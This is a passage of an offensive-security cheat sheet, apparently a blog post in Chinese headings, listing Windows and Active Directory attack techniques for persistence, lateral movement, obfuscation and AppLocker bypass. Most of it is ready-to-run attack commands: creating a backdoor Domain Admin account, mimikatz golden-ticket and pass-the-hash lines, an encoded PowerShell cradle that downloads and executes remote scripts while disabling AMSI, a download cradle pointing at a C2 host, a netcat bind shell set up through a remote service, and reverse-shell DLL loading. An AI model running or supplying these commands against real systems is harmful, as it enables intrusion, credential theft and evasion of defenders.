<h2 id="6-7-Windows启动文件夹"><a href="#6-7-Windows启动文件夹" class="headerlink" title="6.7 Windows启动文件夹"></a>6.7 Windows启动文件夹</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">This has been around for years as basically every version of Windows contains a startup folder. </span><br><span class="line"></span><br><span class="line">Windows 10 - C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</span><br><span class="line"></span><br><span class="line">Current User Startup - C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure>

<h2 id="6-8-EXE-DLL劫持"><a href="#6-8-EXE-DLL劫持" class="headerlink" title="6.8 EXE / DLL劫持"></a>6.8 EXE / DLL劫持</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Look for any missing DLL&apos;s or EXE&apos;s that common programs are calling on startup and over write them with your payload/malware.</span><br><span class="line"></span><br><span class="line">Also if you are localadmin/system you could provide over write a normal service binary or DLL, providing you don&apos;t break the execution.</span><br></pre></td></tr></table></figure>

<h2 id="6-9-添加用户帐号"><a href="#6-9-添加用户帐号" class="headerlink" title="6.9 添加用户帐号"></a>6.9 添加用户帐号</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net user m0chan /add /domain</span><br><span class="line">net group &quot;Domain Admins&quot; m0chan /add /domain</span><br><span class="line">net localgroup &quot;Administrators&quot; /add</span><br><span class="line">net user m0chan /domain /comment:&quot;Your Blueteam Fucking Sucks&quot;</span><br></pre></td></tr></table></figure>

<h4 id="6-10-Kerberos的持久性"><a href="#6-10-Kerberos的持久性" class="headerlink" title="6.10 Kerberos的持久性"></a>6.10 Kerberos的持久性</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">We can dump Kerberos tickets and inject them in session when deemed relevant however tickets have a low life span unless explically requested for 7 days. </span><br><span class="line"></span><br><span class="line">They can be injected into session with mimikatz or Rebeus. </span><br><span class="line"></span><br><span class="line">But let&apos;s say we have pwned a DC and got the KRBTGT Hash we can generate a golden ticket with a 10 year life span.</span><br><span class="line"></span><br><span class="line">kerberos::golden /user:utilisateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:utilisateur.chocolate.kirbi </span><br><span class="line"></span><br><span class="line">SID is the domain SID</span><br><span class="line"></span><br><span class="line">Inject Ticket</span><br><span class="line"></span><br><span class="line">kerberos::ptt Administrateur@krbtgt-CHOCOLATE.LOCAL.kirbi</span><br><span class="line"></span><br><span class="line">Can also inject kirbi with Rebeus</span><br></pre></td></tr></table></figure>

<h1 id="0x07-横向运动"><a href="#0x07-横向运动" class="headerlink" title="0x07 横向运动"></a>0x07 横向运动</h1><h2 id="7-1-Plink"><a href="#7-1-Plink" class="headerlink" title="7.1 Plink"></a>7.1 Plink</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">plink.exe -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS</span><br><span class="line"></span><br><span class="line">#Windows 1803 Built in SSH Client (By Default)</span><br><span class="line"></span><br><span class="line">ssh -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS</span><br></pre></td></tr></table></figure>

<h2 id="7-2-Powershell端口转发"><a href="#7-2-Powershell端口转发" class="headerlink" title="7.2 Powershell端口转发"></a>7.2 Powershell端口转发</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenport=fromport listenaddress=fromip connectport=toport connectaddress=toip</span><br><span class="line"></span><br><span class="line">Permanent ^^</span><br><span class="line"></span><br><span class="line">Requires iphlpsvc service to be enabled</span><br><span class="line"></span><br><span class="line">fromport: the port number to listen on, e.g. 80</span><br><span class="line">fromip: the ip address to listen on, e.g. 192.168.1.1</span><br><span class="line">toport: the port number to forward to</span><br><span class="line">toip: the ip address to forward to</span><br></pre></td></tr></table></figure>

<h2 id="7-3-Invoke-SocksProxy"><a href="#7-3-Invoke-SocksProxy" class="headerlink" title="7.3 Invoke-SocksProxy"></a>7.3 Invoke-SocksProxy</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/p3nt4/Invoke-SocksProxy/</span><br><span class="line"></span><br><span class="line">Local Socks4 Proxy on 1080</span><br><span class="line"></span><br><span class="line">Import-Module .\Invoke-SocksProxy.psm1</span><br><span class="line">Invoke-SocksProxy -bindPort 1080</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Reverse Socks Proxy on Remote Machine Port 1080</span><br><span class="line"></span><br><span class="line"># On the remote host: </span><br><span class="line"># Generate a private key and self signed cert</span><br><span class="line">openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout private.key -out cert.pem</span><br><span class="line"></span><br><span class="line"># Get the certificate fingerprint to verify it:</span><br><span class="line">openssl x509 -in cert.pem -noout -sha1 -fingerprint | cut -d &quot;=&quot; -f 2 | tr -d &quot;:&quot;</span><br><span class="line"></span><br><span class="line"># Start the handler</span><br><span class="line">python ReverseSocksProxyHandler.py 443 1080 ./cert.pem ./private.key</span><br><span class="line"></span><br><span class="line"># On the local host:</span><br><span class="line">Import-Module .\Invoke-SocksProxy.psm1</span><br><span class="line">Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 </span><br><span class="line"></span><br><span class="line"># Go through the system proxy:</span><br><span class="line">Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 -useSystemProxy</span><br><span class="line"></span><br><span class="line"># Validate certificate</span><br><span class="line">Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 -useSystemProxy -certFingerprint &apos;93061FDB30D69A435ACF96430744C5CC5473D44E&apos;</span><br></pre></td></tr></table></figure>

<h2 id="7-4-Socat-for-Windows"><a href="#7-4-Socat-for-Windows" class="headerlink" title="7.4 Socat for Windows"></a>7.4 Socat for Windows</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/StudioEtrange/socat-windows</span><br><span class="line"></span><br><span class="line">Generate SSL Cert for Encryption</span><br><span class="line">openssl req -new -x509 -days 365 -nodes -out cert.pem -keyout cert.key</span><br><span class="line"></span><br><span class="line">Server : socat OPENSSL-LISTEN:443,cert=/cert.pem -</span><br><span class="line">Client : socat - OPENSSL:localhost:443</span><br><span class="line"></span><br><span class="line">#Port Forward</span><br><span class="line"></span><br><span class="line">socat OPENSSL-LISTEN:443,cert=/cert.pem,fork TCP:202.54.1.5:443</span><br><span class="line"></span><br><span class="line">All SSL Connections will be redirected to 202.54.1.5:443</span><br><span class="line"></span><br><span class="line">#Non SSL Port Forward</span><br><span class="line">socat TCP-LISTEN:80,fork TCP:202.54.1.5:80</span><br></pre></td></tr></table></figure>

<h2 id="7-5-SharpExec"><a href="#7-5-SharpExec" class="headerlink" title="7.5 SharpExec"></a>7.5 SharpExec</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/anthemtotheego/SharpExec</span><br><span class="line"></span><br><span class="line">C# Implementation of Conventional Lateral Movement Techniques, such as </span><br><span class="line"></span><br><span class="line">-WMIExec - Semi-Interactive shell that runs as the user. Best described as a less mature version of Impacket&apos;s wmiexec.py tool.</span><br><span class="line"></span><br><span class="line">-SMBExec - Semi-Interactive shell that runs as NT Authority\System. Best described as a less mature version of Impacket&apos;s smbexec.py tool.</span><br><span class="line"></span><br><span class="line">-PSExec (like functionality) - Gives the operator the ability to execute remote commands as NT Authority\System or upload a file and execute it with or without arguments as NT Authority\System.</span><br><span class="line"></span><br><span class="line">-WMI - Gives the operator the ability to execute remote commands as the user or upload a file and execute it with or without arguments as the user.</span><br></pre></td></tr></table></figure>

<h2 id="7-6-安全套接字漏斗"><a href="#7-6-安全套接字漏斗" class="headerlink" title="7.6 安全套接字漏斗"></a>7.6 安全套接字漏斗</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#https://0xdf.gitlab.io/2019/01/28/tunneling-with-chisel-and-ssf.html#ssf</span><br><span class="line">#git clone https://github.com/securesocketfunneling/ssf.git</span><br><span class="line"></span><br><span class="line">Massive shout out to 0xdf for explaining this perfectly in his article. Couldnt have done it better myself.</span><br></pre></td></tr></table></figure>

<h2 id="7-7-凿子（通过SSH保护的HTTP上的快速TCP隧道）"><a href="#7-7-凿子（通过SSH保护的HTTP上的快速TCP隧道）" class="headerlink" title="7.7 凿子（通过SSH保护的HTTP上的快速TCP隧道）"></a>7.7 凿子（通过SSH保护的HTTP上的快速TCP隧道）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#https://0xdf.gitlab.io/2019/01/28/tunneling-with-chisel-and-ssf.html</span><br></pre></td></tr></table></figure>

<h2 id="7-8-CrackMapExec"><a href="#7-8-CrackMapExec" class="headerlink" title="7.8 CrackMapExec"></a>7.8 CrackMapExec</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec-lateral-movement/</span><br></pre></td></tr></table></figure>

<h2 id="7-9-WMIC-Spawn-Process"><a href="#7-9-WMIC-Spawn-Process" class="headerlink" title="7.9 WMIC Spawn Process"></a>7.9 WMIC Spawn Process</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:WS02 /user:DOMAIN\m0chan /password:m0chan process call create &quot;powershell.exe -Enc aQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA2AC8ARwBvAG8AZABuAGkAZwBoAHQALgBwAHMAMQAiACkAKQA7ACAAaQBmACgAWwBCAHkAcABhAHMAcwAuAEEATQBTAEkAXQA6ADoARABpAHMAYQBiAGwAZQAoACkAIAAtAGUAcQAgACIAMAAiACkAIAB7ACAAaQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA2AC8ASABSAEUAdgBlAG4AdABzAC4AcABzADEAIgApACkAIAB9AA==&quot;</span><br></pre></td></tr></table></figure>

<h2 id="7-10-WinRS"><a href="#7-10-WinRS" class="headerlink" title="7.10 WinRS"></a>7.10 WinRS</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/winrs</span><br><span class="line"></span><br><span class="line">winrs [/&lt;parameter&gt;[:&lt;value&gt;]] &lt;command&gt;  </span><br><span class="line"></span><br><span class="line">winrs /r:https://contoso.com command</span><br><span class="line"></span><br><span class="line">winrs /r:http://[1080:0:0:0:8:800:200C:417A]:80 command  </span><br><span class="line"></span><br><span class="line">winrs /r:myserver /ad /u:administrator /p:$%fgh7 dir \\anotherserver\share</span><br></pre></td></tr></table></figure>

<h2 id="7-11-Invoke-WMIExec-ps1"><a href="#7-11-Invoke-WMIExec-ps1" class="headerlink" title="7.11 Invoke-WMIExec.ps1"></a>7.11 Invoke-WMIExec.ps1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Invoke-WMIExec -Target 10.10.14.14 -Username rweston_da -Hash 3ff61fa259deee15e4042159d</span><br><span class="line">7b832fa -Command &quot;net user user pass /add /domain&quot;</span><br><span class="line"></span><br><span class="line">PS C:\users\user\Downloads&gt; Invoke-WMIExec -Target 10.10.120.1 -Username m0chan -Hash 3ff61fa259deee15e4042159d</span><br><span class="line">7b832fa -Command &quot;net group &quot;&quot;Domain Admins&quot;&quot; m0chan /add /domain&quot;</span><br></pre></td></tr></table></figure>

<h2 id="7-12-Powershell调用命令（需要端口5985）"><a href="#7-12-Powershell调用命令（需要端口5985）" class="headerlink" title="7.12 Powershell调用命令（需要端口5985）"></a>7.12 Powershell调用命令（需要端口5985）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$secpasswd = ConvertTo-SecureString &apos;pass&apos; -AsPlainText -Force</span><br><span class="line">$cred = New-Object System.Management.Automation.PSCredential(&apos;m0chan\user&apos;, $secpasswd)</span><br><span class="line"></span><br><span class="line">Invoke-Command -ComputerName FS01 -Credential $cred -ScriptBlock &#123;whoami&#125;</span><br></pre></td></tr></table></figure>

<h2 id="7-13-PSExec"><a href="#7-13-PSExec" class="headerlink" title="7.13 PSExec"></a>7.13 PSExec</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe \\dc01.m0chanAD.local cmd.exe</span><br></pre></td></tr></table></figure>

<h2 id="7-14-Powershell-Remoting"><a href="#7-14-Powershell-Remoting" class="headerlink" title="7.14 Powershell Remoting"></a>7.14 Powershell Remoting</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$secpasswd = ConvertTo-SecureString &apos;password&apos; -AsPlainText -Force</span><br><span class="line">$cred = New-Object System.Management.Automation.PSCredential(&apos;WS02\USER&apos;, $secpasswd)</span><br><span class="line"></span><br><span class="line">$Session = New-PSSession -ComputerName FileServer -Credential $cred</span><br><span class="line">Enter-PSSession $Session</span><br></pre></td></tr></table></figure>

<h2 id="7-15-通过SMB配置远程服务（在目标计算机上需要本地管理员）"><a href="#7-15-通过SMB配置远程服务（在目标计算机上需要本地管理员）" class="headerlink" title="7.15 通过SMB配置远程服务（在目标计算机上需要本地管理员）"></a>7.15 通过SMB配置远程服务（在目标计算机上需要本地管理员）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.0.15 [password] /u:DOMAIN\m0chan</span><br><span class="line"></span><br><span class="line">sc \\192.168.0.15 create &lt;service_name&gt; binpath= &quot;cmd.exe /k COMMAND&quot;</span><br><span class="line">sc \\192.168.0.15 create &lt;service_name&gt; binpath= &quot;cmd.exe /k &lt;c:\tools\nc.exe -L -p &lt;port&gt; -e cmd.exe&gt;&quot;</span><br><span class="line">sc \\192.168.0.15 start &lt;service_name&gt;</span><br></pre></td></tr></table></figure>

<h2 id="7-16-Pass-The-Hash"><a href="#7-16-Pass-The-Hash" class="headerlink" title="7.16 Pass-The-Hash"></a>7.16 Pass-The-Hash</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec &lt;ip&gt; -u &lt;user&gt; -H &quot;&lt;lm&gt;&quot; -x &quot;&lt;msfvenom psh-cmd&gt;&quot;</span><br><span class="line"></span><br><span class="line">impacket-wmiexec &lt;user&gt;@&lt;ip&gt; -hashes &lt;lm:nt&gt;</span><br><span class="line"></span><br><span class="line">pth-winexe -U &lt;user&gt;%&lt;ntlm&gt; //&lt;ip&gt; &quot;&lt;msfvenom psh-cmd&gt;&quot;</span><br><span class="line"></span><br><span class="line">python wmiexec.py -hashes :&lt;hash&gt; &lt;user&gt;@&lt;ip&gt;</span><br><span class="line"></span><br><span class="line">xfreerdp /u:&lt;user&gt; /d:&lt;domain&gt; /pth:&lt;ntlm&gt; /v:&lt;ip&gt;:3389 /dynamic-resolution</span><br><span class="line"></span><br><span class="line">sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a</span><br></pre></td></tr></table></figure>

<h2 id="7-17-Pass-The-Ticket"><a href="#7-17-Pass-The-Ticket" class="headerlink" title="7.17 Pass-The-Ticket"></a>7.17 Pass-The-Ticket</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#Check my Blog Post Kerberos Attacks in Depth for Further Information</span><br><span class="line"></span><br><span class="line">Rebeus monitor /interval:30 </span><br><span class="line"></span><br><span class="line">Monitoring logon sessions every 30 seconds so I can pinch Kerb tickets</span><br><span class="line"></span><br><span class="line">Reubus will now give you a Kerberos ticket in base64 which you can pass with</span><br><span class="line"></span><br><span class="line">Rubeus.exe ptt /ticket:[base64blobhere]</span><br><span class="line"></span><br><span class="line">We can now request TGS service tickets to access network resources as this user</span><br></pre></td></tr></table></figure>

<h1 id="0x08-混淆-规避技术"><a href="#0x08-混淆-规避技术" class="headerlink" title="0x08 混淆/规避技术"></a>0x08 混淆/规避技术</h1><h2 id="8-1-调用混淆"><a href="#8-1-调用混淆" class="headerlink" title="8.1 调用混淆"></a>8.1 调用混淆</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/danielbohannon/Invoke-Obfuscation</span><br><span class="line"></span><br><span class="line">Can obfusacte Scripts &amp; Commands </span><br><span class="line"></span><br><span class="line">Obfusacte script from remote url </span><br><span class="line"></span><br><span class="line">SET SCRIPTPATH https://thisdosentexist.m0chan.com/Invoke-Mimikatz.ps1</span><br><span class="line"></span><br><span class="line">Can also set Sscript block base64 PS</span><br><span class="line"></span><br><span class="line">SET SCRIPTBLOCK powershell -enc VwByAGkAdABlAC0ASABvAHMAdAAgACcAWQBvAHUAIABjAGEAbgAgAHUAcwBlACAAYgBhAHMAaQBjACAALQBlAG4A==</span><br></pre></td></tr></table></figure>

<h2 id="8-2-调用-CradleCraft"><a href="#8-2-调用-CradleCraft" class="headerlink" title="8.2 调用-CradleCraft"></a>8.2 调用-CradleCraft</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/danielbohannon/Invoke-CradleCrafter</span><br><span class="line"></span><br><span class="line">Similar to Invoke-Obfusaction but allows you to obfusacte cradles for downloading i/e</span><br><span class="line"></span><br><span class="line">IEX (New-Object Net.WebClient).DownloadString(&apos;http://c2server.com/Invoke-Mimikatz.ps1&apos;)</span><br></pre></td></tr></table></figure>

<h2 id="8-3-调用DOSfuscation"><a href="#8-3-调用DOSfuscation" class="headerlink" title="8.3 调用DOSfuscation"></a>8.3 调用DOSfuscation</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/danielbohannon/Invoke-DOSfuscation</span><br></pre></td></tr></table></figure>

<h2 id="8-4-Unicorn"><a href="#8-4-Unicorn" class="headerlink" title="8.4 Unicorn"></a>8.4 Unicorn</h2><blockquote>
<p><a href="https://github.com/trustedsec/unicorn" target="_blank" rel="noopener">https://github.com/trustedsec/unicorn</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unicorn.py Nishang.ps1</span><br></pre></td></tr></table></figure>

<h1 id="0x09-AppLocker-约束模式绕过"><a href="#0x09-AppLocker-约束模式绕过" class="headerlink" title="0x09 AppLocker /约束模式绕过"></a>0x09 AppLocker /约束模式绕过</h1><h2 id="9-1-验证您是否处于受限模式"><a href="#9-1-验证您是否处于受限模式" class="headerlink" title="9.1 验证您是否处于受限模式"></a>9.1 验证您是否处于受限模式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ExecutionContext.SessionState.LanguageMode</span><br></pre></td></tr></table></figure>

<h2 id="9-2-Powershell非常少旁路"><a href="#9-2-Powershell非常少旁路" class="headerlink" title="9.2 Powershell非常少旁路"></a>9.2 Powershell非常少旁路</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/decoder-it/powershellveryless.git</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /reference: C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\system.management.automation.dll </span><br><span class="line">/out:C:\Users\m0chan\Scripts\powershellveryless.exe </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /reference:C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\system.management.automation.dll /out:c:\setup\powershellveryless.exe c:\scripts\powershellveryless.cs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Execute -&gt; powershellveryless.exe script.ps1</span><br><span class="line"></span><br><span class="line">script.ps1 = Script of your Choice</span><br></pre></td></tr></table></figure>

<h2 id="9-3-世界可写文件夹（在Windows-10-1803上为默认）"><a href="#9-3-世界可写文件夹（在Windows-10-1803上为默认）" class="headerlink" title="9.3 世界可写文件夹（在Windows 10 1803上为默认）"></a>9.3 世界可写文件夹（在Windows 10 1803上为默认）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md</span><br><span class="line"></span><br><span class="line">C:\Windows\Tasks </span><br><span class="line">C:\Windows\Temp </span><br><span class="line">C:\windows\tracing</span><br><span class="line">C:\Windows\Registration\CRMLog</span><br><span class="line">C:\Windows\System32\FxsTmp</span><br><span class="line">C:\Windows\System32\com\dmp</span><br><span class="line">C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys</span><br><span class="line">C:\Windows\System32\spool\PRINTERS</span><br><span class="line">C:\Windows\System32\spool\SERVERS</span><br><span class="line">C:\Windows\System32\spool\drivers\color</span><br><span class="line">C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter</span><br><span class="line">C:\Windows\SysWOW64\FxsTmp</span><br><span class="line">C:\Windows\SysWOW64\com\dmp</span><br><span class="line">C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter</span><br><span class="line">C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System</span><br></pre></td></tr></table></figure>

<h2 id="9-4-降级攻击"><a href="#9-4-降级攻击" class="headerlink" title="9.4 降级攻击"></a>9.4 降级攻击</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Downgrading to PS Version 2 circumvates Constrained Mode</span><br><span class="line"></span><br><span class="line">powershell.exe -version 2</span><br><span class="line"></span><br><span class="line">Verifiy versions with $PSVersionTable</span><br><span class="line">Get-Host</span><br></pre></td></tr></table></figure>

<h2 id="9-5-AppLocker-COR配置文件绕过"><a href="#9-5-AppLocker-COR配置文件绕过" class="headerlink" title="9.5 AppLocker COR配置文件绕过"></a>9.5 AppLocker COR配置文件绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">set COR_ENABLE_PROFILING=1</span><br><span class="line">COR_PROFILER=&#123;cf0d821e-299b-5307-a3d8-b283c03916db&#125;</span><br><span class="line">set COR_PROFILER_PATH=C:\Users\m0chan\pwn\reverseshell.dll</span><br><span class="line">tzsync</span><br><span class="line">powershell</span><br><span class="line"></span><br><span class="line">Where .DLL is your payload i/e reverse shell, beacon etc.</span><br></pre></td></tr></table></figure>

<h2 id="9-6-MSBuild-Powershell-CMD旁路"><a href="#9-6-MSBuild-Powershell-CMD旁路" class="headerlink" title="9.6 MSBuild Powershell / CMD旁路"></a>9.6 MSBuild Powershell / CMD旁路</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">You can use this if cmd is not disabled but powershell is</span><br><span class="line"></span><br><span class="line">https://github.com/Cn33liz/MSBuildShell/blob/master/MSBuildShell.csproj</span><br><span class="line"></span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe pshell.csproj</span><br><span class="line"></span><br><span class="line">Also https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c</span><br><span class="line"></span><br><span class="line">MSBuild PSAttack :D :D</span><br></pre></td></tr></table></figure>

